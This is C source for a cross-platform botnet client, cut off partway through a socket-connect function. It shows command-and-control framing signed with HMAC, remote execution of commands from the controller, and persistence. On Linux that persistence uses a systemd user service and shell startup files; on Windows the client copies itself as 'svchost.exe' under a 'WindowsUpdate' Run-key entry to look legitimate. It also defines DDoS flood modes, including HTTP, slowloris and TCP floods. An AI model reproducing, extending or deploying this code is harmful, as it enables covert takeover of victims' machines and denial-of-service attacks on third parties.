// client.c — C2 + DDoS + HMAC + persistence. v2.12-fix
// Linux:   gcc -O2 -Wall -Wextra client.c -o client -lpthread
// Windows: cl /O2 client.c ws2_32.lib advapi32.lib

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <ctype.h>

#ifdef _WIN32
  #include <winsock2.h>
  #include <ws2tcpip.h>
  #include <windows.h>
  #include <wincrypt.h>
  #define strdup _strdup
  typedef SOCKET sock_t;
  #define CLOSE_SOCK closesocket
  #define SOCK_ERR SOCKET_ERROR
  #define INVALID_SOCK (-1)
  #define SLEEP_MS(ms) Sleep(ms)
  #define THREAD_HANDLE HANDLE
  #define THREAD_CREATE(h,f,a) ((h)=CreateThread(NULL,0,(f),(a),0,NULL))
  #define THREAD_JOIN(h) do{ if(h){ WaitForSingleObject((h),INFINITE); CloseHandle(h);} }while(0)
  typedef DWORD (WINAPI *thread_fn)(LPVOID);
#else
  #include <unistd.h>
  #include <arpa/inet.h>
  #include <sys/socket.h>
  #include <sys/types.h>
  #include <sys/wait.h>
  #include <netinet/in.h>
  #include <netdb.h>
  #include <poll.h>
  #include <signal.h>
  #include <errno.h>
  #include <fcntl.h>
  #include <pthread.h>
  #include <sys/stat.h>
  typedef int sock_t;
  #define CLOSE_SOCK close
  #define SOCK_ERR (-1)
  #define INVALID_SOCK (-1)
  #define SLEEP_MS(ms) safe_sleep_ms(ms)
  #define THREAD_HANDLE pthread_t
  #define THREAD_CREATE(h,f,a) pthread_create(&(h),NULL,(f),(a))
  #define THREAD_JOIN(h) do{ if(h) pthread_join((h),NULL);}while(0)
  typedef void *(*thread_fn)(void *);
#endif

#define BUF 32768
#define OUT_CHUNK 8192
#define CMD_MAX 4096
#define PING_MS 15000
#define CMD_TIMEOUT_MS 30000
#define POLL_SLICE_MS 50
#define CMD_QUEUE_MAX 32
#define CMD_ID_LEN 16

#define RECONNECT_BASE_MS 5000
#define RECONNECT_MAX_MS 300000
#define RECONNECT_JITTER 0.30
#define SESSION_OK_MS 15000

#define DDOS_THREADS_MAX 64
#define DDOS_PKTSIZE_MAX 1400
#define DDOS_DURATION_MAX 3600
#define DDOS_DELAY_MAX_MS 10000

#define CONNECT_TIMEOUT_MS 2000
#define SND_TIMEOUT_MS 5000
#define DD_SND_TIMEOUT_MS 2000

#define HMAC_WINDOW 300.0
#define NONCE_TTL   300.0
#define NONCE_KEEP  4096

static const unsigned char g_psk_fallback[32] = {
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};
static unsigned char g_psk[32];
static unsigned char g_psk_prev[32];
static int g_psk_ok = 0;
static int g_psk_prev_ok = 0;

static sock_t g_fd = INVALID_SOCK;
static char g_id[64];

#ifdef _WIN32
static volatile LONG g_conn_alive = 0;
#define CONN_ALIVE() (InterlockedCompareExchange((volatile LONG*)&g_conn_alive,1,1)==1)
#define CONN_SET(v) InterlockedExchange((volatile LONG*)&g_conn_alive,(v))
#else
static volatile int g_conn_alive = 0;
#define CONN_ALIVE() (g_conn_alive == 1)
#define CONN_SET(v) (g_conn_alive = (v))
#endif

#ifndef _WIN32
static void safe_sleep_ms(int ms) {
    if (ms <= 0) return;
    while (ms > 0) {
        int chunk = ms > 999 ? 999 : ms;
        struct timespec ts = { .tv_sec = 0, .tv_nsec = (long)chunk * 1000000L };
        nanosleep(&ts, NULL); ms -= chunk;
    }
}
#endif

#ifdef _WIN32
static CRITICAL_SECTION g_send_cs;
#define SEND_LOCK() EnterCriticalSection(&g_send_cs)
#define SEND_UNLOCK() LeaveCriticalSection(&g_send_cs)
#else
static pthread_mutex_t g_send_mu = PTHREAD_MUTEX_INITIALIZER;
#define SEND_LOCK() pthread_mutex_lock(&g_send_mu)
#define SEND_UNLOCK() pthread_mutex_unlock(&g_send_mu)
#endif

typedef struct cmd_node { char *cmd; char cmd_id[CMD_ID_LEN+1]; int seq; struct cmd_node *next; } cmd_node;
static cmd_node *q_head = NULL, *q_tail = NULL;
static int q_count = 0, q_shutdown = 0;

#ifdef _WIN32
static CRITICAL_SECTION g_q_cs; static CONDITION_VARIABLE g_q_cv;
#define Q_LOCK() EnterCriticalSection(&g_q_cs)
#define Q_UNLOCK() LeaveCriticalSection(&g_q_cs)
#define Q_WAIT() SleepConditionVariableCS(&g_q_cv,&g_q_cs,INFINITE)
#define Q_SIGNAL() WakeConditionVariable(&g_q_cv)
#else
static pthread_mutex_t g_q_mu = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t g_q_cv = PTHREAD_COND_INITIALIZER;
#define Q_LOCK() pthread_mutex_lock(&g_q_mu)
#define Q_UNLOCK() pthread_mutex_unlock(&g_q_mu)
#define Q_WAIT() pthread_cond_wait(&g_q_cv,&g_q_mu)
#define Q_SIGNAL() pthread_cond_signal(&g_q_cv)
#endif

/* SHA-256 */
typedef struct { uint32_t state[8]; uint64_t bitlen; uint8_t buffer[64]; size_t buflen; } sha256_ctx;
static const uint32_t sha256_k[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};
#define ROTR32(x,n) (((x)>>(n))|((x)<<(32-(n))))
static void sha256_init(sha256_ctx *c){
    c->state[0]=0x6a09e667;c->state[1]=0xbb67ae85;c->state[2]=0x3c6ef372;c->state[3]=0xa54ff53a;
    c->state[4]=0x510e527f;c->state[5]=0x9b05688c;c->state[6]=0x1f83d9ab;c->state[7]=0x5be0cd19;
    c->bitlen=0;c->buflen=0;
}
static void sha256_compress(sha256_ctx *c,const uint8_t *b){
    uint32_t w[64];
    for(int i=0;i<16;i++)w[i]=((uint32_t)b[i*4]<<24)|((uint32_t)b[i*4+1]<<16)|((uint32_t)b[i*4+2]<<8)|b[i*4+3];
    for(int i=16;i<64;i++){uint32_t s0=ROTR32(w[i-15],7)^ROTR32(w[i-15],18)^(w[i-15]>>3);
        uint32_t s1=ROTR32(w[i-2],17)^ROTR32(w[i-2],19)^(w[i-2]>>10); w[i]=w[i-16]+s0+w[i-7]+s1;}
    uint32_t a=c->state[0],bb=c->state[1],cc=c->state[2],d=c->state[3],e=c->state[4],f=c->state[5],g=c->state[6],h=c->state[7];
    for(int i=0;i<64;i++){uint32_t S1=ROTR32(e,6)^ROTR32(e,11)^ROTR32(e,25);uint32_t ch=(e&f)^(~e&g);
        uint32_t t1=h+S1+ch+sha256_k[i]+w[i];uint32_t S0=ROTR32(a,2)^ROTR32(a,13)^ROTR32(a,22);
        uint32_t mj=(a&bb)^(a&cc)^(bb&cc);uint32_t t2=S0+mj;
        h=g;g=f;f=e;e=d+t1;d=cc;cc=bb;bb=a;a=t1+t2;}
    c->state[0]+=a;c->state[1]+=bb;c->state[2]+=cc;c->state[3]+=d;
    c->state[4]+=e;c->state[5]+=f;c->state[6]+=g;c->state[7]+=h;
}
static void sha256_update(sha256_ctx *c,const uint8_t *d,size_t n){
    for(size_t i=0;i<n;i++){c->buffer[c->buflen++]=d[i];
        if(c->buflen==64){sha256_compress(c,c->buffer);c->bitlen+=512;c->buflen=0;}}
}
static void sha256_final(sha256_ctx *c,uint8_t out[32]){
    size_t i=c->buflen;
    if(c->buflen<56){c->buffer[i++]=0x80;while(i<56)c->buffer[i++]=0;}
    else{c->buffer[i++]=0x80;while(i<64)c->buffer[i++]=0;sha256_compress(c,c->buffer);memset(c->buffer,0,56);}
    c->bitlen+=c->buflen*8;
    for(int j=0;j<8;j++)c->buffer[63-j]=(uint8_t)(c->bitlen>>(j*8));
    sha256_compress(c,c->buffer);
    for(int j=0;j<8;j++){out[j*4]=(uint8_t)(c->state[j]>>24);out[j*4+1]=(uint8_t)(c->state[j]>>16);
        out[j*4+2]=(uint8_t)(c->state[j]>>8);out[j*4+3]=(uint8_t)(c->state[j]);}
}
static void hmac_sha256(const uint8_t *key,size_t keylen,const uint8_t *msg,size_t msglen,uint8_t out[32]){
    uint8_t k_ipad[64],k_opad[64],tk[32];
    if(keylen>64){sha256_ctx c;sha256_init(&c);sha256_update(&c,key,keylen);sha256_final(&c,tk);key=tk;keylen=32;}
    memset(k_ipad,0x36,64);memset(k_opad,0x5c,64);
    for(size_t i=0;i<keylen;i++){k_ipad[i]^=key[i];k_opad[i]^=key[i];}
    uint8_t inner[32];sha256_ctx c;
    sha256_init(&c);sha256_update(&c,k_ipad,64);sha256_update(&c,msg,msglen);sha256_final(&c,inner);
    sha256_init(&c);sha256_update(&c,k_opad,64);sha256_update(&c,inner,32);sha256_final(&c,out);
}
static void hex32(const uint8_t in[32],char out[65]){
    static const char *hx="0123456789abcdef";
    for(int i=0;i<32;i++){out[i*2]=hx[in[i]>>4];out[i*2+1]=hx[in[i]&0xF];}
    out[64]=0;
}
static void hash8_hex(const char *s,char out[9]){
    sha256_ctx c;uint8_t h[32];
    sha256_init(&c);sha256_update(&c,(const uint8_t*)s,(size_t)strlen(s));sha256_final(&c,h);
    static const char *hx="0123456789abcdef";
    for(int i=0;i<4;i++){out[i*2]=hx[h[i]>>4];out[i*2+1]=hx[h[i]&0xF];}
    out[8]=0;
}

/* PSK parsing */
static int parse_hex32(const char *s,unsigned char out[32]){
    if(!s||strlen(s)!=64)return -1;
    for(int i=0;i<32;i++){
        char hi=s[i*2],lo=s[i*2+1];
        int h=(hi>='0'&&hi<='9')?hi-'0':(hi>='a'&&hi<='f')?hi-'a'+10:(hi>='A'&&hi<='F')?hi-'A'+10:-1;
        int l=(lo>='0'&&lo<='9')?lo-'0':(lo>='a'&&lo<='f')?lo-'a'+10:(lo>='A'&&lo<='F')?lo-'A'+10:-1;
        if(h<0||l<0)return -1;
        out[i]=(unsigned char)((h<<4)|l);
    }
    return 0;
}
static void load_psk(void){
    const char *env=getenv("C2_PSK");
    if(env){
        if(parse_hex32(env,g_psk)==0)g_psk_ok=1;
        else fprintf(stderr,"C2_PSK invalid: must be 64 hex chars\n");
    }
    const char *prev=getenv("C2_PSK_PREV");
    if(prev){
        if(parse_hex32(prev,g_psk_prev)==0)g_psk_prev_ok=1;
        else fprintf(stderr,"C2_PSK_PREV invalid: must be 64 hex chars\n");
    }
    if(!g_psk_ok){
        int any=0;
        for(int i=0;i<32;i++)if(g_psk_fallback[i]){any=1;break;}
        if(any){memcpy(g_psk,g_psk_fallback,32);g_psk_ok=1;}
    }
}

/* nonce cache */
typedef struct { char nonce[17]; double ts; } nonce_ent;
static nonce_ent g_nonces[NONCE_KEEP];
static int g_nonce_head=0,g_nonce_cnt=0;
#ifdef _WIN32
static CRITICAL_SECTION g_nonce_cs;
#define NONCE_LOCK() EnterCriticalSection(&g_nonce_cs)
#define NONCE_UNLOCK() LeaveCriticalSection(&g_nonce_cs)
#else
static pthread_mutex_t g_nonce_mu=PTHREAD_MUTEX_INITIALIZER;
#define NONCE_LOCK() pthread_mutex_lock(&g_nonce_mu)
#define NONCE_UNLOCK() pthread_mutex_unlock(&g_nonce_mu)
#endif

static int nonce_seen_add(const char *nonce,double ts){
    if(!nonce||strlen(nonce)!=16)return 1;
    double now=(double)time(NULL);
    if(ts-now>HMAC_WINDOW)return 1;
    if(now-ts>HMAC_WINDOW)return 1;
    NONCE_LOCK();
    for(int i=0;i<g_nonce_cnt;i++){
        if(strcmp(g_nonces[i].nonce,nonce)==0&&now-g_nonces[i].ts<NONCE_TTL){
            NONCE_UNLOCK();return 1;
        }
    }
    nonce_ent *e=&g_nonces[g_nonce_head];
    strncpy(e->nonce,nonce,16);e->nonce[16]=0;e->ts=ts;
    g_nonce_head=(g_nonce_head+1)%NONCE_KEEP;
    if(g_nonce_cnt<NONCE_KEEP)g_nonce_cnt++;
    NONCE_UNLOCK();
    return 0;
}

/* json */
static void json_escape(const char *in,int inlen,char *out,int outmax){
    int o=0;
    for(int i=0;i<inlen;i++){
        unsigned char c=(unsigned char)in[i];
        if(o>=outmax-8)break;
        switch(c){
            case '"': out[o++]='\\';out[o++]='"';break;
            case '\\':out[o++]='\\';out[o++]='\\';break;
            case '\n':out[o++]='\\';out[o++]='n';break;
            case '\r':out[o++]='\\';out[o++]='r';break;
            case '\t':out[o++]='\\';out[o++]='t';break;
            default:
                if(c<0x20){
                    int w=snprintf(out+o,outmax-o,"\\u%04x",c);
                    if(w<0||o+w>=outmax){o=outmax-1;break;}
                    o+=w;
                } else out[o++]=(char)c;
        }
    }
    out[o]=0;
}
static int json_get_str(const char *j,const char *k,char *out,int outmax){
    char pat[64];snprintf(pat,sizeof(pat),"\"%s\":\"",k);
    const char *p=strstr(j,pat);if(!p)return 0;p+=strlen(pat);int o=0;
    while(*p&&*p!='"'&&o<outmax-1){
        if(*p=='\\'&&p[1]){p++;switch(*p){case 'n':out[o++]='\n';break;case 'r':out[o++]='\r';break;
            case 't':out[o++]='\t';break;case '"':out[o++]='"';break;case '\\':out[o++]='\\';break;
            default:out[o++]=*p;break;}p++;}
        else out[o++]=*p++;
    }
    out[o]=0;return 1;
}
static int json_get_int(const char *j,const char *k,int *out){
    char pat[64];snprintf(pat,sizeof(pat),"\"%s\":",k);
    const char *p=strstr(j,pat);if(!p)return 0;p+=strlen(pat);while(*p==' ')p++;
    char *end=NULL;
    long v=strtol(p,&end,10);
    if(end==p)return 0;
    *out=(int)v;return 1;
}

/* transport */
static int send_all(sock_t fd,const char *b,int len){
    int s=0;while(s<len){int n=send(fd,b+s,len-s,0);if(n==SOCK_ERR||n<=0)return -1;s+=n;}return s;
}
static int send_frame_raw(const char *json){
    if(!CONN_ALIVE())return -1;
    SEND_LOCK();sock_t fd=g_fd;SEND_UNLOCK();
    if(fd==INVALID_SOCK)return -1;
    int n=(int)strlen(json);int r=send_all(fd,json,n);
    if(r>=0)r=send_all(fd,"\n",1);
    return r;
}
typedef struct { sock_t fd; char buf[BUF]; int len; int pos; } line_reader;
static void lr_init(line_reader *lr,sock_t fd){lr->fd=fd;lr->len=0;lr->pos=0;}
static int lr_read_line(line_reader *lr,char *out,int max){
    int i=0;
    while(i<max-1){
        if(lr->pos>=lr->len){
            int n=recv(lr->fd,lr->buf,sizeof(lr->buf),0);
            if(n==SOCK_ERR||n<=0)return -1;
            lr->len=n;lr->pos=0;
        }
        char c=lr->buf[lr->pos++];
        if(c=='\n'){out[i]=0;return i;}
        out[i++]=c;
    }
    return -1;
}

/* HMAC */
static const char* _payload_for_hash(const char *typ,const char *cmd,const char *data){
    if(!strcmp(typ,"CMD")||!strcmp(typ,"CMD_ACK")||!strcmp(typ,"CMD_RESULT"))return cmd?cmd:"";
    if(!strcmp(typ,"OUT"))return data?data:"";
    return "";
}
static void sign_frame_key(const unsigned char *key,const char *bid,int ts,const char *nonce,
                       const char *typ,const char *cid,
                       const char *cmd,const char *data,char out_hex[65]){
    char h8[9];hash8_hex(_payload_for_hash(typ,cmd,data),h8);
    char msg[512];
    snprintf(msg,sizeof(msg),"%s|%d|%s|%s|%s|%s",bid,ts,nonce,typ,cid?cid:"",h8);
    uint8_t mac[32];hmac_sha256(key,32,(const uint8_t*)msg,strlen(msg),mac);
    hex32(mac,out_hex);
}
static void sign_frame(const char *bid,int ts,const char *nonce,
                       const char *typ,const char *cid,
                       const char *cmd,const char *data,char out_hex[65]){
    sign_frame_key(g_psk,bid,ts,nonce,typ,cid,cmd,data,out_hex);
}
static int verify_frame_key(const unsigned char *key,const char *bid,int ts,const char *nonce,
                        const char *typ,const char *cid,
                        const char *cmd,const char *data,const char *sig_hex){
    char expect[65];
    sign_frame_key(key,bid,ts,nonce,typ,cid,cmd,data,expect);
    return strcmp(expect,sig_hex)==0;
}
static int verify_frame(const char *bid,int ts,const char *nonce,
                        const char *typ,const char *cid,
                        const char *cmd,const char *data,const char *sig_hex){
    double now=(double)time(NULL);
    if(ts-now>HMAC_WINDOW||now-ts>HMAC_WINDOW)return 0;
    if(!nonce||strlen(nonce)!=16)return 0;
    if(verify_frame_key(g_psk,bid,ts,nonce,typ,cid,cmd,data,sig_hex))goto ok;
    if(g_psk_prev_ok&&verify_frame_key(g_psk_prev,bid,ts,nonce,typ,cid,cmd,data,sig_hex))goto ok;
    return 0;
ok:
    if(nonce_seen_add(nonce,(double)ts))return 0;
    return 1;
}

/* потокобезопасный nonce */
static volatile uint64_t g_nonce_counter = 0;
static void gen_nonce(char *out, int max) {
#ifdef _WIN32
    uint64_t c = (uint64_t)InterlockedIncrement64((volatile LONG64*)&g_nonce_counter);
#else
    uint64_t c = __sync_add_and_fetch(&g_nonce_counter, 1);
#endif
    unsigned char buf[8];
    int ok = 0;
#ifdef _WIN32
    HCRYPTPROV prov;
    if (CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        if (CryptGenRandom(prov, 8, buf)) ok = 1;
        CryptReleaseContext(prov, 0);
    }
#else
    FILE *f = fopen("/dev/urandom", "rb");
    if (f) { if (fread(buf, 1, 8, f) == 8) ok = 1; fclose(f); }
#endif
    uint64_t r = 0;
    if (ok) {
        memcpy(&r, buf, 8);
    } else {
        r = ((uint64_t)rand() << 32) | (uint64_t)rand();
    }
    snprintf(out, max, "%016llx", (unsigned long long)(r ^ c ^ (uint64_t)time(NULL)));
}

/* frames */
static void send_ack(const char *cmd_id){
    char nonce[17];gen_nonce(nonce,sizeof(nonce));
    int ts=(int)time(NULL);
    char sig[65];sign_frame(g_id,ts,nonce,"CMD_ACK",cmd_id,"","",sig);
    char frame[400];
    snprintf(frame,sizeof(frame),
        "{\"type\":\"CMD_ACK\",\"id\":\"%s\",\"cmd_id\":\"%s\",\"ts\":%d,\"nonce\":\"%s\",\"hmac\":\"%s\"}",
        g_id,cmd_id,ts,nonce,sig);
    send_frame_raw(frame);
}
static void send_result(const char *cmd_id,int code,int timed_out){
    char nonce[17];gen_nonce(nonce,sizeof(nonce));
    int ts=(int)time(NULL);
    char sig[65];sign_frame(g_id,ts,nonce,"CMD_RESULT",cmd_id,"","",sig);
    char frame[400];
    snprintf(frame,sizeof(frame),
        "{\"type\":\"CMD_RESULT\",\"id\":\"%s\",\"cmd_id\":\"%s\",\"code\":%d,\"timed_out\":%d,"
        "\"ts\":%d,\"nonce\":\"%s\",\"hmac\":\"%s\"}",
        g_id,cmd_id,code,timed_out,ts,nonce,sig);
    send_frame_raw(frame);
}
static void send_out(const char *cmd_id,const char *stream,const char *data,int len){
    if(len<=0) return;
    if(len>OUT_CHUNK) len=OUT_CHUNK;
    char esc[OUT_CHUNK*2+16];json_escape(data,len,esc,sizeof(esc));
    char nonce[17];gen_nonce(nonce,sizeof(nonce));
    int ts=(int)time(NULL);
    char sig[65];sign_frame(g_id,ts,nonce,"OUT",cmd_id,"",esc,sig);
    char frame[OUT_CHUNK*2+512];
    snprintf(frame,sizeof(frame),
        "{\"type\":\"OUT\",\"id\":\"%s\",\"cmd_id\":\"%s\",\"stream\":\"%s\",\"data\":\"%s\","
        "\"ts\":%d,\"nonce\":\"%s\",\"hmac\":\"%s\"}",
        g_id,cmd_id,stream,esc,ts,nonce,sig);
    send_frame_raw(frame);
}
/* HELLO: nonce входит в HMAC */
static int send_hello(const char *host){
    int ts=(int)time(NULL);
    char nonce[17];gen_nonce(nonce,sizeof(nonce));
    char msg[160];snprintf(msg,sizeof(msg),"%s|%d|%s",g_id,ts,nonce);
    uint8_t mac[32];hmac_sha256(g_psk,32,(const uint8_t*)msg,strlen(msg),mac);
    char mh[65];hex32(mac,mh);
    char frame[768];
    snprintf(frame,sizeof(frame),
        "{\"type\":\"HELLO\",\"id\":\"%s\",\"host\":\"%s\",\"os\":\"%s\",\"arch\":\"%s\","
        "\"ts\":%d,\"nonce\":\"%s\",\"hmac\":\"%s\"}",
        g_id,host,
#ifdef _WIN32
        "win",
#else
        "linux",
#endif
        sizeof(void*)==8?"x64":"x86",ts,nonce,mh);
    return send_frame_raw(frame);
}

/* persistence */
#ifndef _WIN32
static void mkdir_p(const char *path){
    char tmp[512];snprintf(tmp,sizeof(tmp),"%s",path);
    for(char *p=tmp+1;*p;p++){if(*p=='/'){*p=0;mkdir(tmp,0700);*p='/';}}
    mkdir(tmp,0700);
}
static int install_persist_linux(const char *exe,char *err,int errmax){
    const char *home=getenv("HOME");if(!home){snprintf(err,errmax,"no HOME");return -1;}
    char dir[512],dst[512];
    snprintf(dir,sizeof(dir),"%s/.local/share/c2-agent",home);mkdir_p(dir);
    snprintf(dst,sizeof(dst),"%s/c2-agent",dir);
    FILE *in=fopen(exe,"rb");if(!in){snprintf(err,errmax,"open: %s",strerror(errno));return -1;}
    FILE *out=fopen(dst,"wb");if(!out){fclose(in);snprintf(err,errmax,"create: %s",strerror(errno));return -1;}
    char b[4096];size_t n;while((n=fread(b,1,sizeof(b),in))>0)fwrite(b,1,n,out);
    fclose(in);fclose(out);chmod(dst,0700);
    char sd[512],unit[512];
    snprintf(sd,sizeof(sd),"%s/.config/systemd/user",home);mkdir_p(sd);
    snprintf(unit,sizeof(unit),"%s/c2-agent.service",sd);
    FILE *u=fopen(unit,"w");
    if(u){
        fprintf(u,"[Unit]\nDescription=C2\nAfter=network-online.target\n\n"
            "[Service]\nType=simple\nExecStart=%s\nRestart=always\nRestartSec=15\n"
            "StandardOutput=null\nStandardError=null\n\n"
            "[Install]\nWantedBy=default.target\n",dst);
        fclose(u);
        if(system("/usr/bin/loginctl enable-linger $USER >/dev/null 2>&1") != 0) {}
        int rc=system("/usr/bin/systemctl --user daemon-reload >/dev/null 2>&1");
        rc|=system("/usr/bin/systemctl --user enable c2-agent.service >/dev/null 2>&1");
        rc|=system("/usr/bin/systemctl --user start c2-agent.service >/dev/null 2>&1");
        if(rc==0)return 0;
    }
    const char *cand[]={".profile",".bashrc",".zshrc"};
    for(int i=0;i<3;i++){
        char rc[512];snprintf(rc,sizeof(rc),"%s/%s",home,cand[i]);
        struct stat st;if(stat(rc,&st)!=0)continue;
        FILE *f=fopen(rc,"r");int marked=0;
        if(f){char line[512];while(fgets(line,sizeof(line),f)){if(strstr(line,"# c2-agent autostart")){marked=1;break;}}fclose(f);}
        if(marked)return 0;
        f=fopen(rc,"a");if(!f)continue;
        fprintf(f,"\n# c2-agent autostart\n(nohup %s >/dev/null 2>&1 &)\n",dst);fclose(f);return 0;
    }
    snprintf(err,errmax,"no rc");return -1;
}
static int uninstall_persist_linux(char *err,int errmax){
    (void)err;(void)errmax;
    const char *home=getenv("HOME");if(!home)return -1;
    if(system("/usr/bin/systemctl --user stop c2-agent.service >/dev/null 2>&1") != 0) {}
    if(system("/usr/bin/systemctl --user disable c2-agent.service >/dev/null 2>&1") != 0) {}
    char p[512];
    snprintf(p,sizeof(p),"%s/.config/systemd/user/c2-agent.service",home);unlink(p);
    snprintf(p,sizeof(p),"%s/.local/share/c2-agent/c2-agent",home);unlink(p);
    return 0;
}
#else
static int install_persist_win(const char *exe,char *err,int errmax){
    char ad[MAX_PATH];if(!GetEnvironmentVariableA("APPDATA",ad,MAX_PATH)){snprintf(err,errmax,"no APPDATA");return -1;}
    char dir[MAX_PATH],dst[MAX_PATH];
    snprintf(dir,sizeof(dir),"%s\\Microsoft\\Windows",ad);
    CreateDirectoryA(dir,NULL);
    snprintf(dst,sizeof(dst),"%s\\svchost.exe",dir);
    if(!CopyFileA(exe,dst,FALSE)){
        DWORD e=GetLastError();
        if(e!=ERROR_SHARING_VIOLATION){snprintf(err,errmax,"CopyFile %lu",e);return -1;}
    }
    HKEY hk;
    if(RegCreateKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,NULL,0,KEY_SET_VALUE,NULL,&hk,NULL)!=ERROR_SUCCESS){snprintf(err,errmax,"RegCreateKeyEx");return -1;}
    char cl[MAX_PATH*2];snprintf(cl,sizeof(cl),"\"%s\"",dst);
    LONG r=RegSetValueExA(hk,"WindowsUpdate",0,REG_SZ,(const BYTE*)cl,(DWORD)strlen(cl)+1);
    RegCloseKey(hk);if(r!=ERROR_SUCCESS){snprintf(err,errmax,"RegSet %ld",r);return -1;}
    return 0;
}
static int uninstall_persist_win(char *err,int errmax){
    (void)err;(void)errmax;
    HKEY hk;
    if(RegOpenKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,KEY_SET_VALUE,&hk)==ERROR_SUCCESS){RegDeleteValueA(hk,"WindowsUpdate");RegCloseKey(hk);}
    char ad[MAX_PATH],dst[MAX_PATH];
    if(GetEnvironmentVariableA("APPDATA",ad,MAX_PATH)){
        snprintf(dst,sizeof(dst),"%s\\Microsoft\\Windows\\svchost.exe",ad);DeleteFileA(dst);
    }
    return 0;
}
#endif
static int do_install_persist(char *err,int errmax){
#ifdef _WIN32
    char self[MAX_PATH];if(!GetModuleFileNameA(NULL,self,MAX_PATH)){snprintf(err,errmax,"GMFN");return -1;}
    return install_persist_win(self,err,errmax);
#else
    char self[512];ssize_t n=readlink("/proc/self/exe",self,sizeof(self)-1);
    if(n<=0){snprintf(err,errmax,"readlink");return -1;}
    self[n]=0;return install_persist_linux(self,err,errmax);
#endif
}
static int do_uninstall_persist(char *err,int errmax){
#ifdef _WIN32
    return uninstall_persist_win(err,errmax);
#else
    return uninstall_persist_linux(err,errmax);
#endif
}

/* DDoS */
typedef enum { DD_NONE=0,DD_HTTP_FLOOD,DD_HTTP_BURST,DD_HTTP_BYPASS,DD_HTTP_SLOWLORIS,
    DD_TCP_FLOOD,DD_TCP_BURST,DD_TCP_SLOWLORIS,DD_MC_PING } dd_method_t;
typedef struct {
    char target_host[256];char target_path[512];int target_port;
    dd_method_t method;int pktsize,duration,delay_ms,threads;
#ifdef _WIN32
    volatile LONG stop_flag,active,total_packets,result_sent;
#else
    volatile int stop_flag,active,total_packets,result_sent;
#endif
    THREAD_HANDLE stats_thr,workers[DDOS_THREADS_MAX];int nworkers;
} dd_state_t;
static dd_state_t g_dd;
static char g_dd_cmd_id[CMD_ID_LEN+1];
static volatile int g_dd_gen=0;
#ifdef _WIN32
static CRITICAL_SECTION g_dd_cs;
#define DD_LOCK() EnterCriticalSection(&g_dd_cs)
#define DD_UNLOCK() LeaveCriticalSection(&g_dd_cs)
#else
static pthread_mutex_t g_dd_mu=PTHREAD_MUTEX_INITIALIZER;
#define DD_LOCK() pthread_mutex_lock(&g_dd_mu)
#define DD_UNLOCK() pthread_mutex_unlock(&g_dd_mu)
#endif

/* сериализация start/stop */
#ifdef _WIN32
static CRITICAL_SECTION g_dd_op_cs;
#define DD_OP_LOCK() EnterCriticalSection(&g_dd_op_cs)
#define DD_OP_UNLOCK() LeaveCriticalSection(&g_dd_op_cs)
#else
static pthread_mutex_t g_dd_op_mu=PTHREAD_MUTEX_INITIALIZER;
#define DD_OP_LOCK() pthread_mutex_lock(&g_dd_op_mu)
#define DD_OP_UNLOCK() pthread_mutex_unlock(&g_dd_op_mu)
#endif

static int dd_gen_next(void){
#ifdef _WIN32
    return (int)InterlockedIncrement((volatile LONG*)&g_dd_gen);
#else
    return __sync_add_and_fetch(&g_dd_gen,1);
#endif
}
static int dd_gen_get(void){
#ifdef _WIN32
    return (int)InterlockedCompareExchange((volatile LONG*)&g_dd_gen,0,0);
#else
    return __sync_fetch_and_add(&g_dd_gen,0);
#endif
}

/* xorshift32 */
static unsigned int dd_rand(unsigned int *seed){
    unsigned int x=*seed;
    x^=x<<13; x^=x>>17; x^=x<<5;
    *seed=x;
    return x;
}
static unsigned int dd_seed_init(void){
#ifdef _WIN32
    return (unsigned int)GetTickCount64() ^ (unsigned int)(uintptr_t)GetCurrentThreadId() ^ (unsigned int)time(NULL);
#else
    return (unsigned int)(uintptr_t)pthread_self() ^ (unsigned int)time(NULL);
#endif
}

static int resolve_target(const char *h,int port,struct sockaddr_in *out){
    memset(out,0,sizeof(*out));out->sin_family=AF_INET;out->sin_port=htons((unsigned short)port);
    if(inet_pton(AF_INET,h,&out->sin_addr)==1)return 0;
    struct addrinfo hints,*res=NULL;memset(&hints,0,sizeof(hints));
    hints.ai_family=AF_INET;hints.ai_socktype=SOCK_STREAM;
    if(getaddrinfo(h,NULL,&hints,&res)!=0||!res)return -1;
    out->sin_addr=((struct sockaddr_in*)res->ai_addr)->sin_addr;freeaddrinfo(res);return 0;
}
static sock_t connect_to(const struct sockaddr_in *srv,int timeout_ms){
    sock_t s=socket(AF_INET,SOCK_STREAM,0);if(s==INVALID_SOCK)return INVALID_SOCK;
#ifdef _WIN32
    u_long nb=1;ioctlsocket(s,FIONBIO,&nb);
#else
    int fl=fcntl(s,F_GETFL,0);fcntl(s,F_SETFL,fl|O_NONBLOCK);
#endif
    int rc=connect(s,(const struct sockaddr*)srv,sizeof(*srv));
    if(rc<0){
#ifdef _WIN32
